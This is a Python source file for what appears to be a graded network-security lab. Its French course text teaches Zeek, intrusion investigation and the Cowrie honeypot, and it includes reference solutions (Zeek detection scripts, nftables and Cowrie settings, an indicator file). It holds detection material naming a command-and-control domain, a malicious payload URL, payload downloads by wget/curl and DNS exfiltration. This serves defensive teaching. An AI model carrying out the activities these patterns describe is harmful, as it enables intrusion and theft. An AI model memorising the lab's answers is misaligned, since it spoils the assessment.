        _http(www, other, 44000 + variant, "/", 200, 5.0),                                                  # elsewhere
    ]
    return {"start": 1764000000.0 + 86400 * variant, "events": events}


def training_spec(d) -> dict:
    events = web_scan_spec(d, 0)["events"]
    offset = max(e["at"] for e in events) + 30.0
    events += [dict(e, at=e["at"] + offset) for e in honeypot_spec(d, 0)["events"]]
    return {"start": 1763900000.0, "events": events}


def intel_spec(d) -> dict:
    """Bonus: harmless traffic first (the input framework reads the file meanwhile), then the indicators."""
    www = str(d.ips.www.ip)
    lan = d.nets.lan.network_address
    return {"start": 1764100000.0, "events": [
        _http(str(lan + 30), www, 45000, "/index.html", 200, 0.0, host=f"www.{DOMAIN}"),
        {"kind": "dns", "src": str(lan + 31), "dst": www, "sport": 53010, "qname": d.intel["domain"], "at": 3.0},
        _http(wan_addr(d, INTEL_HOST), www, 45001, "/", 200, 3.5, host=f"www.{DOMAIN}"),
        _http(str(lan + 32), www, 45002, d.intel["path"], 200, 4.0, host=f"www.{DOMAIN}"),
    ]}


# ---------------------------------------------------------------------------
# NetScheme
# ---------------------------------------------------------------------------


class NetScheme(NetScheme0):
    _machine_specs = {
        'attacker': {**PLAIN_MACHINE, 'color': 'mistyrose'},
        'probe': {**PLAIN_MACHINE, 'hidden': True, 'allow_connection': False},
        'gw': {**PLAIN_MACHINE, 'color': 'lightyellow'},
        'www': {**PLAIN_MACHINE, 'color': 'lightgrey'},
        'honeypot': {**NSM_INIT, 'color': 'gold'},
        # weights measured on s16 at an evaluation's peak (3.9 MiB a unit): Zeek and the grader's offline runs
        # 233 MiB, an idle workstation 8 MiB; the honeypot takes the image's (systemd + Cowrie, 109 MiB)
        'sensor': {**NSM_PLAIN, 'color': 'lightblue', 'weight': 60},
        'analyst': {**NSM_PLAIN, 'color': 'lightcyan', 'weight': 2},
    }
    _network_specs = {
        'wan': {'mode': 'switch', 'color': 'mistyrose', 'shape': 'cloud'},
        'dmz': {'mode': 'hub', 'color': 'lightgreen'},
        'lan': {'mode': 'switch', 'color': 'lightcyan'},
    }
    _topology = _TOPOLOGY

    def __init__(self, data, running_lab_name):
        super().__init__(data=data, running_lab_name=running_lab_name)
        self.informations = self.course()

    # -- the course ------------------------------------------------------------------------

    def course(self):
        return (
            no_tr("## ") + title + no_tr("\n\n")
            + tr("**Sommaire**\n\n") + info_toc()
            + info_subtitle(tr("La supervision de sécurité réseau"), tag="nsm")
            + tr("""

La **supervision de sécurité réseau** (*Network Security Monitoring*, NSM) consiste à **collecter**,
**analyser** et **conserver** des traces de l'activité du réseau, pour détecter les intrusions et pour
pouvoir, après coup, reconstituer ce qui s'est passé. Elle part d'un constat : la prévention finit
toujours par échouer un jour ; il faut alors **voir** l'attaquant une fois entré, et avoir gardé de quoi
enquêter.

Les traces, de la plus volumineuse à la plus légère :

| type | exemple | ce qu'on en tire | conservation |
|------|---------|------------------|--------------|
| contenu complet | une capture `pcap` (tcpdump, Wireshark) | tout, y compris les fichiers transférés | heures, jours |
| transactions | les journaux de Zeek (`http.log`, `dns.log`...) | qui a demandé quoi, à qui, avec quelle réponse | mois |
| sessions, flux | `conn.log` de Zeek, NetFlow / IPFIX | qui a parlé à qui, combien, combien de temps | mois, années |
| alertes | Suricata, les *notices* de Zeek | ce qu'une règle a jugé suspect | années |

Une alerte seule dit rarement tout : l'analyste remonte de l'alerte aux transactions et aux sessions,
puis au contenu quand il l'a encore. Un IDS à signatures (Suricata) cherche ce qu'on lui a décrit ;
**Zeek** décrit tout ce qu'il voit, ce qui permet de chercher après coup ce qu'on ne savait pas encore
chercher (la *chasse aux menaces*, *threat hunting*). Les deux se complètent.

La sonde reçoit une **copie** du trafic (un port miroir, un TAP, ou ici un concentrateur) sur une
interface **sans adresse** : elle n'émet rien sur le réseau observé et s'administre par une autre
interface.
""")
            + info_subtitle(tr("Réponse à incident et preuves"), tag="response")
            + tr("""

Le guide NIST SP 800-61 découpe la réponse à un incident en phases : **préparation** (sondes, journaux,
procédures), **détection et analyse**, **confinement**, **éradication** et **rétablissement**, puis
**retour d'expérience**. Ce TP traite surtout de la détection et de l'analyse : établir ce qui s'est
passé, quand, depuis où, et ce qui a été touché.

Les règles d'une investigation (*forensics*) :

- **ne jamais travailler sur l'original** : copier la preuve, calculer son empreinte à la collecte
  (`sha256sum`), la vérifier avant toute analyse (`sha256sum -c`) ; une empreinte qui change désigne
  une preuve altérée. Noter qui a eu la preuve en main, et quand (la **chaîne de possession**) ;
- **horodater en UTC**, et vérifier que les horloges étaient synchronisées (NTP) : corréler des
  journaux dont les horloges divergent mène à de fausses conclusions ;
- **noter chaque étape** (les commandes et leurs résultats) : l'analyse doit être reproductible ;
- construire une **chronologie** (*timeline*) : la liste datée des événements, de la première trace de
  l'attaquant à la dernière ;
- en tirer des **indicateurs de compromission** (*IOC*) : adresses, noms de domaine, URL, empreintes de
  fichiers, à rechercher ailleurs et à partager (section @@ref:intel@@).
""")
            + info_subtitle(tr("Zeek"), tag="zeek")
            + tr("""

**Zeek** (anciennement Bro) est un moniteur de sécurité réseau libre. Il ne compare pas seulement le
trafic à des signatures : il **analyse les protocoles** et décrit chaque échange dans des **journaux**
structurés. Deux couches :

1. un **moteur d'événements** (en C++) capture les paquets, reconstitue les connexions et les flux TCP,
   reconnaît les protocoles (DNS, HTTP, TLS, SSH, SMB...) quel que soit le port, et produit des
   **événements** : `new_connection`, `dns_request`, `http_request`, `http_reply`,
   `connection_state_remove`...
2. des **scripts**, écrits dans le langage de Zeek, réagissent à ces événements : ceux qui sont fournis
   écrivent les journaux, d'autres détectent (scans, force brute SSH, injections SQL) et lèvent des
   **notices** (section @@ref:notice@@) ; on y ajoute les siens (section @@ref:scripting@@).

Zeek analyse une interface en direct (`zeek -i eth1 local`) ou une capture (`zeek -r capture.pcap`) :
la même analyse, ce qui en fait un outil d'investigation autant que de supervision. Zeek ne bloque
rien : c'est un outil de **visibilité**. D'une session chiffrée (HTTPS, SSH), il ne voit que les
métadonnées : le nom du serveur (SNI), le certificat, les versions, les volumes et les durées.
""")
            + info_subtitle(tr("Les journaux de Zeek"), tag="zeek-logs")
            + tr("""

Zeek écrit un fichier par type d'activité, une ligne par transaction : dans le répertoire courant pour
`zeek -r`, dans `/opt/zeek/logs/current/` pour une sonde en service (les journaux des heures passées sont
archivés, compressés, dans `/opt/zeek/logs/AAAA-MM-JJ/`).

| journal | une ligne par... | champs utiles |
|---------|------------------|---------------|
| `conn.log` | connexion TCP, UDP, ICMP | `id.orig_h`, `id.orig_p`, `id.resp_h`, `id.resp_p`, `proto`, `service`, `duration`, `orig_bytes`, `resp_bytes`, `conn_state`, `history`, `local_orig`, `local_resp` |
| `dns.log` | requête DNS | `query`, `qtype_name`, `rcode_name`, `answers` |
| `http.log` | requête HTTP | `method`, `host`, `uri`, `user_agent`, `status_code`, `resp_fuids` |
| `files.log` | fichier transféré | `fuid`, `mime_type`, `filename`, `md5`, `sha1`, `sha256` |
| `ssl.log` | session TLS | `server_name` (SNI), `version`, `cipher` |
| `ssh.log` | session SSH | `client`, `server`, `auth_success` (une estimation) |
| `notice.log` | notice d'un script | `note`, `msg`, `src`, `sub` |
| `intel.log` | indicateur reconnu | `seen.indicator`, `seen.where` |
| `weird.log` | anomalie de protocole | `name` |

Chaque connexion reçoit un identifiant unique, le **`uid`** (`CHhAvVGS1DHFjwGM9`), repris par toutes les
lignes qui la concernent : la ligne de `conn.log`, les requêtes de `http.log`, les fichiers de `files.log`
se relient par lui. Le **`community_id`** (`1:LQU9qZlK+B5F3KDmev6m5PMibrg=`, chargé par
`@load policy/protocols/conn/community-id-logging`) est un hachage du quintuplet (adresses, ports,
protocole) que Suricata et d'autres outils calculent aussi : il relie les journaux d'outils différents.

`conn_state` résume le déroulement d'une connexion TCP :

| `conn_state` | signification |
|--------------|---------------|
| `S0` | un SYN sans réponse (port filtré) |
| `REJ` | un SYN refusé par un RST (port fermé) |
| `S1` | établie, pas encore terminée |
| `SF` | établie et terminée normalement |
| `RSTO` / `RSTR` | interrompue par un RST de l'origine / du répondeur |
| `OTH` | début de connexion non vu |

et `history` en détaille les étapes, une lettre par événement, majuscule pour l'origine et minuscule
pour le répondeur : `S` SYN, `h` SYN-ACK, `A` ACK, `D` données, `F` FIN, `R` RST. `ShADadFf` est une
connexion complète, `Sr` un port fermé ; un SYN-ACK suivi d'un RST de l'origine (`ShR`) est la
signature d'un scan SYN (`nmap -sS`).
""")
            + info_subtitle(tr("Mettre une sonde en service : zeekctl"), tag="zeekctl")
            + tr("""

Sur une sonde, Zeek est piloté par **`zeekctl`**, configuré dans `/opt/zeek/etc/` :

- `node.cfg` : les processus de Zeek. Une sonde autonome :

```
[zeek]
type=standalone
host=localhost
interface=eth1
```

  (pour un gros débit, un *cluster* : un manager, un proxy et plusieurs *workers* qui se partagent le
  trafic) ;
- `networks.cfg` : les **réseaux locaux**, un par ligne (`10.1.2.0/24   DMZ`). Zeek en déduit les champs
  `local_orig` et `local_resp` de `conn.log`, donc le sens de chaque connexion (entrante, sortante,
  interne), et plusieurs scripts s'en servent (`known-hosts`, la détection des scans...). Attention :
  Zeek tient aussi pour locales, par défaut, toutes les adresses de `Site::private_address_space` (les
  réseaux privés de la RFC 1918, mais aussi 100.64.0.0/10, 198.18.0.0/15, les plages de documentation...) ;
  pour que seul `networks.cfg` compte, `redef Site::private_address_space_is_local = F;` dans
  `local.zeek` ;
- `zeekctl.cfg` : les répertoires, la rotation des journaux (`LogRotationInterval`, une heure).

La **politique du site** est `/opt/zeek/share/zeek/site/local.zeek` : les scripts chargés (`@load`) et les
réglages (`redef`). Pour des journaux en **JSON** plutôt qu'en colonnes séparées par des tabulations,
on y ajoute :

```
@load policy/tuning/json-logs
```

| commande | effet |
|----------|-------|
| `zeekctl check` | vérifie la configuration et les scripts |
| `zeekctl deploy` | installe la configuration et (re)démarre Zeek : après **chaque** modification |
| `zeekctl status` | l'état des processus |
| `zeekctl stop` | arrête Zeek |
| `zeekctl diag` | le diagnostic d'un processus qui ne démarre pas |

Une carte réseau calcule souvent elle-même les sommes de contrôle (*checksum offloading*) : une capture
faite sur la machine émettrice montre alors des sommes fausses, et Zeek ignore ces paquets (`weird.log` :
`bad_TCP_checksum`). Pour lire une telle capture : `zeek -C -r capture.pcap` (ou
`redef ignore_checksums = T;`).
""")
            + info_subtitle(tr("Lire les journaux : zeek-cut et jq"), tag="zeek-cut")
            + tr("""

Au format TSV, `zeek-cut` extrait des colonnes par leur nom (il lit l'en-tête `#fields`) :

```
zeek-cut id.orig_h id.resp_h id.resp_p service conn_state < conn.log
zeek-cut -u ts query answers < dns.log
```

(`-u` : les dates en UTC lisibles ; `-d` en heure locale). Au format JSON, une ligne est un objet, et
`jq` sélectionne, transforme et compte :

```
jq -c '[.ts, ."id.orig_h", .host, .uri]' http.log
jq -r 'select(.status_code == 404) | ."id.orig_h"' http.log | sort | uniq -c | sort -rn
jq -r 'select(.conn_state == "REJ") | ."id.resp_p"' conn.log | sort -n | uniq
jq -r 'select(.query | endswith(".example")) | .query' dns.log
```

Un nom qui contient un point s'écrit entre guillemets : `."id.orig_h"`. `jq -s` (*slurp*) lit tout le
fichier comme un tableau (pour grouper : `group_by`, `length`). `date -u -d @1764000000` convertit un `ts`
en date.
""")
            + info_subtitle(tr("Écrire un script Zeek"), tag="scripting")
            + tr("""

Un script déclare des **gestionnaires d'événements**. Les types usuels : `addr` (`10.1.2.3`), `subnet`
(`10.1.2.0/24`), `port` (`80/tcp`), `count`, `int`, `string`, `bool` (`T` / `F`), `time`, `interval`
(`30sec`, `2min`), et les conteneurs `set[addr]`, `table[addr] of count`, `vector of string`, `record`.
Une connexion est un `record` de type `connection` : `c$id$orig_h`, `c$id$orig_p`, `c$id$resp_h`,
`c$id$resp_p`, `c$uid`.

```
module DEMO;

export {
    const watched = 10.1.2.3 &redef;      # une constante qu'un redef peut changer
}

global per_client: table[addr] of count &default=0 &create_expire=5min;

event http_request(c: connection, method: string, original_URI: string,
                   unescaped_URI: string, version: string)
    {
    if ( c$id$resp_h != watched )
        return;
    per_client[c$id$orig_h] += 1;
    print fmt("%s -> %s : %s (%d)", c$id$orig_h, c$id$resp_h, original_URI, per_client[c$id$orig_h]);
    }
```

Quelques événements : `zeek_init()` (au démarrage), `new_connection(c: connection)` (le premier paquet
d'une connexion, TCP, UDP ou ICMP : `c$id$orig_h` est celui qui l'a ouverte),
`connection_established(c: connection)` (une poignée de main TCP complète),
`http_reply(c: connection, version: string, code: count, reason: string)`,
`dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)`,
`connection_state_remove(c: connection)` (la connexion oubliée).

Les attributs d'une table règlent la **durée de vie** de ses entrées : `&create_expire = 5min` (5 minutes
après sa **création** : une fenêtre qui commence au premier événement), `&write_expire` (après la
dernière écriture), `&read_expire` (après la dernière lecture) ; `&default = 0` donne la valeur d'une
clé absente. Une adresse se teste par `if ( a in 10.1.2.0/24 )`, `Site::is_local_addr(a)`.

Pour essayer un script : dans un répertoire vide, `zeek -C -r capture.pcap mon-script.zeek` ; `print`
écrit dans le terminal, une erreur est signalée avec son numéro de ligne (`zeek --parse-only script.zeek`
vérifie la syntaxe seule).
""")
            + info_subtitle(tr("Les notices"), tag="notice")
            + tr("""

Un script signale ce qu'il juge important en levant une **notice**, écrite dans `notice.log` :

```
module DEMO;

export {
    redef enum Notice::Type += { Big_Upload };     # le type DEMO::Big_Upload
}

event connection_state_remove(c: connection)
    {
    if ( c$orig?$size && c$orig$size > 10000000 )
        NOTICE([$note=Big_Upload, $conn=c,
                $msg=fmt("%s a envoyé %d octets", c$id$orig_h, c$orig$size),
                $identifier=cat(c$id$orig_h)]);
    }
```

- `$note` : le type, déclaré par `redef enum Notice::Type += { ... };` dans le bloc `export` d'un
  `module` : il s'appelle alors `Module::Nom` (`DEMO::Big_Upload`) ;
- `$msg` : le texte lisible, `$sub` un complément ;
- `$conn = c` remplit l'`uid` et les champs `id.orig_h`, `id.orig_p`, `id.resp_h`, `id.resp_p` de la
  notice ; sans connexion, `$src` donne une adresse (le champ `src`) ;
- `$identifier` (et `$suppress_for`, une heure par défaut) : deux notices de même type et de même
  identifiant dans ce délai n'en font qu'une.

Le crochet `hook Notice::policy` ajoute des actions (courriel, `Notice::ACTION_ALARM`...).
""")
            + info_subtitle(tr("Le renseignement sur les menaces : le cadre Intel"), tag="intel")
            + tr("""

Les indicateurs de compromission partagés (par un CERT, une plate-forme MISP, un flux commercial) se
donnent à Zeek dans un fichier texte : une ligne d'en-tête `#fields`, puis un indicateur par ligne, les
champs séparés par **une tabulation** (jamais des espaces : la cause la plus fréquente d'un fichier
ignoré, signalée dans `reporter.log`) :

```
#fields	indicator	indicator_type	meta.source	meta.desc
203.0.113.66	Intel::ADDR	CERT-X	scanner connu
evil.example	Intel::DOMAIN	CERT-X	domaine de commande et contrôle
www.example.org/payload.exe	Intel::URL	CERT-X	charge malveillante
```

Les types : `Intel::ADDR`, `Intel::SUBNET`, `Intel::DOMAIN`, `Intel::URL` (sans `http://` : l'hôte suivi
du chemin, comme `Host` + l'URI de la requête), `Intel::FILE_HASH`, `Intel::EMAIL`, `Intel::USER_AGENT`,
`Intel::CERT_HASH`... Le chargement, dans `local.zeek` :

```
@load frameworks/intel/seen
redef Intel::read_files += { "/opt/zeek/share/zeek/site/intel.dat" };
```

`frameworks/intel/seen` présente au cadre Intel ce que Zeek voit : les adresses des connexions, les
requêtes DNS, les URL et en-têtes HTTP, les empreintes des fichiers, les certificats... Une
correspondance est écrite dans `intel.log` (`seen.indicator`, et `seen.where` : `Conn::IN_ORIG`,
`DNS::IN_REQUEST`, `HTTP::IN_URL`...). Le fichier est relu quand il change : la sonde n'a pas besoin
d'être redémarrée. En lecture d'une capture, en revanche, Zeek peut avoir fini avant d'avoir lu le
fichier (il le lit en parallèle) : `zeek --pseudo-realtime=1 -r capture.pcap` rejoue la capture à sa
vitesse réelle.
""")
            + info_subtitle(tr("Analyser une capture"), tag="pcap")
            + tr("""

Une méthode :

1. **intégrité** : `sha256sum -c incident.pcap.sha256`, puis travailler sur une copie ;
2. **vue d'ensemble** : `capinfos incident.pcap` (dates, durée, nombre de paquets),
   `tshark -r incident.pcap -q -z conv,ip` (les conversations), `-z io,phs` (les protocoles) ;
3. **journaux** : `mkdir zeek && cd zeek && zeek -C -r ../incident.pcap local`, puis les questions par
   `zeek-cut` ou `jq` : qui parle le plus, à qui, quels noms sont demandés, quels fichiers passent
   (`local` charge la politique du site : les empreintes des fichiers, entre autres) ;
4. **zoom** sur ce qui intrigue, avec `tshark` et un filtre d'affichage, ou Wireshark (*Follow TCP
   Stream*).

| besoin | commande |
|--------|----------|
| des champs choisis | `tshark -r f.pcap -Y 'http.request' -T fields -e frame.time_epoch -e ip.src -e http.host -e http.request.uri` |
| le contenu d'un flux TCP | `tshark -r f.pcap -q -z follow,tcp,ascii,5` (le flux n° 5 : champ `tcp.stream`) |
| les statistiques HTTP | `tshark -r f.pcap -q -z http,tree` |
| les noms demandés | `tshark -r f.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name` |
| les champs des formulaires envoyés | `tshark -r f.pcap -Y urlencoded-form -T fields -e urlencoded-form.key -e urlencoded-form.value` |
| extraire les fichiers | `tshark -r f.pcap --export-objects http,/tmp/objets` |

Zeek extrait aussi les fichiers (`@load frameworks/files/extract-all-files`, dans `extract_files/`), et
`files.log` donne leurs empreintes (`frameworks/files/hash-all-files`, chargé par `local`). Un formulaire
envoie ses champs encodés (`application/x-www-form-urlencoded`) : `%21` est `!`, `+` une espace ;
tshark les décode (`urlencoded-form.value`), le contenu brut d'un flux les montre tels quels.
""")
            + info_subtitle(tr("Reconnaître une attaque dans le trafic"), tag="patterns")
            + tr("""

| activité | ce qu'on voit |
|----------|---------------|
| **scan de ports** | une source, une cible (ou beaucoup), de nombreux ports en peu de temps ; `REJ` (fermé) ou `S0` (filtré) ; pour un port **ouvert**, un SYN-ACK suivi d'un RST de la source (`ShR`) |
| **recherche de mots de passe** | des requêtes répétées vers la même cible et le même service (`POST /login`, SSH), des réponses d'échec (`401`, ou `200` avec un message d'erreur), puis une réponse différente : le succès (`302`, un cookie) |
| **téléchargement d'une charge** | un `GET` d'un script ou d'un exécutable, souvent par un outil en ligne de commande (`Wget`, `curl`, `python-requests`) ; dans `files.log`, le type MIME et les empreintes |
| **balise de C2** (*beaconing*) | une machine interne qui contacte la même destination à **intervalle régulier** (parfois avec une petite gigue), de petites requêtes et réponses, un User-Agent incongru |
| **exfiltration par DNS** | des noms très longs, des sous-domaines tous différents sous un même domaine, un contenu à forte entropie (hexadécimal, base32, base64) : les données sont **dans les noms demandés**, les réponses importent peu (`NXDOMAIN`) |
| **mouvement latéral** | des connexions internes inhabituelles (SMB, RDP, SSH) depuis une machine compromise |

Pour mesurer un intervalle : les `ts` des requêtes, puis leurs différences successives
(`... | awk 'NR > 1 {print $1 - p} {p = $1}'`). Pour décoder de l'hexadécimal :
`echo 48656c6c6f | xxd -r -p`.
""")
            + info_subtitle(tr("Les pots de miel"), tag="honeypot")
            + tr("""

Un **pot de miel** (*honeypot*) est un système **leurre**, sans usage légitime, offert aux attaquants
pour les observer. Puisque personne n'a de raison de s'y connecter, **toute connexion est suspecte** :
pas de faux positif, une alerte précoce (un attaquant qui explore le réseau interne y tombe), et des
journaux riches sur ses méthodes (les mots de passe essayés, les commandes, les logiciels téléchargés).

Trois niveaux d'**interaction** :

- **basse** : un service qui accepte la connexion et note qui frappe (une bannière, un port ouvert) ;
- **moyenne** : l'émulation d'un service et d'un système. **Cowrie** est un serveur SSH et un shell
  factices : l'attaquant croit taper des commandes, rien n'est réellement exécuté ;
- **haute** : un vrai système instrumenté : le plus réaliste, et le plus risqué.

Précautions :

- un pot de miel ne doit servir de **rebond** à personne : l'isoler (DMZ, VLAN), filtrer ses connexions
  sortantes et le surveiller ; un pot de miel qui ouvre lui-même une connexion est une alerte en soi ;
- son vrai accès d'administration passe par un autre port, ouvert au seul réseau des administrateurs ;
- le rendre **crédible** : un nom d'hôte, une bannière, un noyau, des fichiers plausibles ; un Cowrie
  laissé avec ses réglages par défaut (le nom `svr04`, sa bannière, son noyau) se reconnaît en une
  commande ;
- côté juridique, on n'observe que ses propres systèmes ; les journaux contiennent des données
  personnelles au sens du RGPD (des adresses IP) : durée de conservation et accès à définir. On ne
  « contre-attaque » jamais.

Exposé à Internet, un pot de miel étudie les attaques de masse ; placé à l'intérieur (DMZ, réseaux
internes), il sert de **détecteur d'intrusion**.
""")
            + info_subtitle(tr("Cowrie"), tag="cowrie")
            + tr("""

**Cowrie** est un pot de miel SSH et Telnet à interaction moyenne, en Python. Il est installé ici dans
`/opt/cowrie` (un environnement virtuel `cowrie-env`), et tourne sous l'utilisateur **`cowrie`** (il
refuse de tourner en root) :

| chemin | contenu |
|--------|---------|
| `/opt/cowrie/etc/cowrie.cfg` | la configuration (créée par `cowrie init` : une copie commentée des valeurs par défaut, comme `cowrie.cfg.dist`) |
| `/opt/cowrie/etc/userdb.txt` | les comptes acceptés (absent : ceux de `userdb.example`) |
| `/opt/cowrie/var/log/cowrie/cowrie.json` | les événements, un objet JSON par ligne |
| `/opt/cowrie/var/log/cowrie/cowrie.log` | le journal du programme (démarrage, erreurs de configuration) |
| `/opt/cowrie/var/lib/cowrie/tty/` | les sessions enregistrées (à rejouer avec `playlog`) |
| `/opt/cowrie/var/lib/cowrie/downloads/` | les fichiers téléchargés par les attaquants, nommés par leur SHA-256 |

`cowrie.cfg` est un fichier INI ; seules les clés modifiées comptent (Cowrie lit d'abord ses valeurs par
défaut). Les commentaires tiennent sur leur propre ligne, jamais en fin de ligne :

```
[honeypot]
# le nom affiché par l'invite, hostname et uname
hostname = web-old-17
# le nom de la sonde, dans chaque événement (champ sensor)
sensor_name = hp-site-a

[shell]
# ce qu'affiche uname -r
kernel_version = 5.10.0-18-amd64

[ssh]
# la bannière envoyée au client
version = SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u4
listen_endpoints = tcp:2222:interface=0.0.0.0
```

`userdb.txt` : une règle par ligne, `utilisateur:x:mot_de_passe`, lues de haut en bas, **la première qui
correspond décide** ; `*` désigne n'importe quel utilisateur ou mot de passe, un mot de passe précédé de
`!` **refuse**, `/regex/` est une expression régulière (`/regex/i` sans casse) ; une tentative qu'aucune
règle ne reconnaît est refusée :

```
root:x:!root
root:x:!123456
root:x:*
admin:x:admin
```

(`root` avec tout mot de passe sauf `root` et `123456` ; `admin` avec `admin` seulement ; tout autre
compte refusé.)

Cowrie écoute sur le port 2222 : un utilisateur ordinaire ne peut pas ouvrir un port inférieur à 1024.
On lui redirige le port 22 par nftables, après avoir déplacé le vrai `sshd` sur un autre port (`Port`
dans un fichier de `/etc/ssh/sshd_config.d/`, puis `systemctl restart ssh`) :

```
table inet honeypot {
    chain prerouting {
        type nat hook prerouting priority dstnat; policy accept;
        tcp dport 22 redirect to :2222
    }
}
```

Le service `cowrie.service` est fourni, non activé : `systemctl enable --now cowrie`, puis
`systemctl restart cowrie` après chaque modification (Cowrie lit sa configuration au démarrage
seulement), `journalctl -u cowrie` et `cowrie.log` en cas d'échec.
""")
            + info_subtitle(tr("Les journaux de Cowrie"), tag="cowrie-logs")
            + tr("""

Chaque événement de `cowrie.json` porte `eventid`, `timestamp` (UTC), `src_ip`, `session` (12 chiffres
hexadécimaux, propres à une connexion) et `sensor` :

| `eventid` | champs propres |
|-----------|----------------|
| `cowrie.session.connect` | `src_port`, `dst_ip`, `dst_port` |
| `cowrie.client.version` | `version` : le logiciel du client (`SSH-2.0-Go`, `SSH-2.0-libssh_0.9.6`...) |
| `cowrie.client.kex` | `hassh` : l'empreinte des algorithmes proposés par le client |
| `cowrie.login.failed`, `cowrie.login.success` | `username`, `password` |
| `cowrie.command.input` | `input` : la ligne tapée |
| `cowrie.session.file_download` | `url`, `shasum` (SHA-256), `outfile`, `destfile` |
| `cowrie.session.closed` | `duration` |

```
jq -r 'select(.eventid == "cowrie.login.success") | [.src_ip, .username, .password] | @tsv' cowrie.json
jq -r 'select(.eventid == "cowrie.command.input") | [.session, .input] | @tsv' cowrie.json
jq -r 'select(.eventid == "cowrie.login.failed") | .src_ip' cowrie.json | sort | uniq -c | sort -rn
```
""")
            + info_subtitle(tr("Corréler des journaux"), tag="correlation")
            + tr("""

Une même activité laisse des traces dans plusieurs journaux, chacun avec sa vue : le pot de miel voit la
session (les identifiants, les commandes), la sonde réseau voit les connexions (volumes, durées, et ce
que la machine attaquée contacte ensuite). Relier ces traces, c'est les **corréler**. Les clés :

- le **temps** : des horloges synchronisées (NTP), en UTC, et une marge (un journal note le début d'une
  connexion, un autre sa fin) ;
- le **quintuplet** : adresses, ports et protocole. Le port source d'un client change à chaque connexion,
  ce qui en fait une bonne clé ; attention aux traductions d'adresses et de ports (NAT, redirection :
  le pot de miel note le port 2222 que la redirection lui a donné, la sonde a vu le port 22) ;
- les identifiants : `uid` (Zeek), `session` (Cowrie), `community_id` (commun à plusieurs outils).

À grande échelle, un **SIEM** (Wazuh, Elastic, Splunk...) centralise les journaux, les normalise et
automatise ces corrélations ; à la main, `jq` suffit :

```
jq -r 'select(.session == "a1b2c3d4e5f6" and .eventid == "cowrie.session.connect")
       | [.src_ip, .src_port] | @tsv' cowrie.json
jq -c 'select(."id.orig_h" == "203.0.113.7" and ."id.orig_p" == 51234)' conn.log
```
""")
            + info_subtitle(tr("Aide-mémoire"), tag="memo")
            + tr("""

| besoin | commande |
|--------|----------|
| appliquer la configuration de la sonde | `zeekctl deploy` (puis `zeekctl status`) |
| les journaux de la sonde | `ls /opt/zeek/logs/current/` |
| analyser une capture | `mkdir t && cd t && zeek -C -r ../capture.pcap local` |
| essayer un script | `zeek -C -r capture.pcap script.zeek` puis `cat notice.log` |
| extraire des colonnes | `zeek-cut ...` (TSV), `jq` (JSON) |
| vérifier une empreinte | `sha256sum -c fichier.sha256`, `sha256sum fichier` |
| extraire les fichiers HTTP d'une capture | `tshark -r f.pcap --export-objects http,/tmp/objets` |
| redémarrer Cowrie | `systemctl restart cowrie` |
| les événements de Cowrie | `tail -f /opt/cowrie/var/log/cowrie/cowrie.json \\| jq -c .` |
| les règles nftables | `nft list ruleset` |
| les ports en écoute | `ss -ltnp` |
""")
        )

    # -- reference solution (the commands, also shown in the instructor texts) --------------

    def sensor_networks(self):
        return [(self.data.nets.dmz, "DMZ"), (self.data.nets.lan, "LAN")]

    def sensor_cmds(self) -> List[str]:
        return [f"grep -qxF {shlex.quote(line)} {zeek.LOCAL_ZEEK} || echo {shlex.quote(line)} >> {zeek.LOCAL_ZEEK}"
                for line in (JSON_LOAD, PRIVATE_NOT_LOCAL)] + [f"{zeek.ZEEKCTL} deploy"]

    def web_scan_text(self) -> str:
        return f"""module SRE;

export {{
    redef enum Notice::Type += {{ Web_Scan }};
    const threshold = {self.data.scan_threshold} &redef;
}}

# the 404 answers of each client, counted for 2 minutes from the first one
global errors: table[addr] of count &default=0 &create_expire=2min;

event http_reply(c: connection, version: string, code: count, reason: string)
    {{
    if ( code != 404 )
        return;
    local client = c$id$orig_h;
    errors[client] += 1;
    if ( errors[client] == threshold )
        NOTICE([$note=Web_Scan, $src=client,
                $msg=fmt("%s: %d HTTP 404 in less than 2 min", client, threshold)]);
    }}
"""

    def honeypot_script_text(self) -> str:
        return f"""module SRE;

export {{
    redef enum Notice::Type += {{ Honeypot_Outbound }};
    const honeypot = {self.data.ips.honeypot.ip} &redef;
}}

# the first packet of every connection, TCP, UDP or ICMP: orig_h is the host that opened it
event new_connection(c: connection)
    {{
    if ( c$id$orig_h == honeypot )
        NOTICE([$note=Honeypot_Outbound, $conn=c,
                $msg=fmt("the honeypot opened a connection to %s:%s", c$id$resp_h, c$id$resp_p)]);
    }}
"""

    def nft_text(self) -> str:
        return f"""#!/usr/sbin/nft -f
flush ruleset

table inet honeypot {{
    chain prerouting {{
        type nat hook prerouting priority dstnat; policy accept;
        tcp dport 22 redirect to :{hp.COWRIE_PORT}
    }}
    chain input {{
        type filter hook input priority filter; policy accept;
        tcp dport {ADMIN_PORT} ip saddr != {self.data.nets.lan} drop
    }}
}}
"""

    def cowrie_cfg_text(self) -> str:
        h = self.data.honeypot
        return hp.render_cowrie_cfg({
            "honeypot": {"hostname": h["hostname"], "sensor_name": h["sensor"]},
            "shell": {"kernel_version": h["kernel"]},
            "ssh": {"version": FAKE_BANNER},
        })

    def userdb_text(self) -> str:
        h = self.data.honeypot
        rules = [("root", p) for p in h["root_passwords"]] + [("root", "!*"), (h["user2"], "!" + h["user2_refused"]),
                                                             (h["user2"], "*")]
        return hp.render_userdb(rules)

    def intel_text(self) -> str:
        return zeek.render_intel_file([(ind, kind, "CERT", "indicateur du CERT")
                                       for ind, kind, _ in intel_indicators(self.data)])

    def intel_lines(self) -> List[str]:
        return [INTEL_LOAD, f'redef Intel::read_files += {{ "{INTEL_FILE}" }};']

    def _solve_sensor(self):
        self.file('sensor', zeek.NODE_CFG, zeek.render_node_cfg(SENSOR_IFACE))
        self.file('sensor', zeek.NETWORKS_CFG, zeek.render_networks_cfg(self.sensor_networks()))
        for c in self.sensor_cmds()[:-1]:
            self.cmd('sensor', c)
        self.cmd('sensor', f"{zeek.ZEEKCTL} deploy > {DEPLOY_LOG} 2>&1", step=2)

    def _solve_scripts(self):
        self.file('sensor', WEB_SCAN_SCRIPT, self.web_scan_text())
        self.file('sensor', HONEYPOT_SCRIPT, self.honeypot_script_text())

    def _solve_investigation(self):
        inc = self.data.incident
        self.file('analyst', f"{EXTRACTED_DIR}/{inc['dropper']}", dropper_bytes(inc))

    def _solve_honeypot(self):
        self.file('honeypot', SSHD_DROPIN, f"Port {ADMIN_PORT}\n")
        self.cmd('honeypot', "systemctl restart ssh")
